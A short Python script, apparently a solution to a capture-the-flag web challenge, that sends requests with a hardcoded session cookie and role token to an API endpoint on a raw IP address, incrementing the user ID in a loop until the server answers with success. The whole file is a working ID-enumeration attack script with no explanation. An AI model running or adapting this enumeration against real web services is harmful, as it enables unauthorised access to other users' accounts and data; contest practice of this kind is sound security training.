
# -*- coding: UTF-8 -*-
"""
 * @author  zfj
 * @date  2020/10/24 12:55
"""
import requests
import json
uid = 100336889
headers = {
    "Cookie": "session=eyJ1aWQiOiI0OTQ1NDUyIn0.X5PStA.dVZ8aI9Siav4Rv3r4dhc6L0Dg-8;role=7b7bc2512ee1fedcd76bdc68926d4f7b",
    "Referer": "http://45.113.201.36/user.html",
    "User-Agent":"bilibili Security Browser"
}
while True:
    try:
        resp = requests.get("http://45.113.201.36/api/ctf/5?uid="+str(uid),headers=headers)
        print(uid)
        print(resp.json())
        jsonobj = json.loads(resp.text)
        if jsonobj['code'] == 200:
            break
        else:
            uid += 1
            continue
    except Exception as ex:
        print(ex)
print("finish")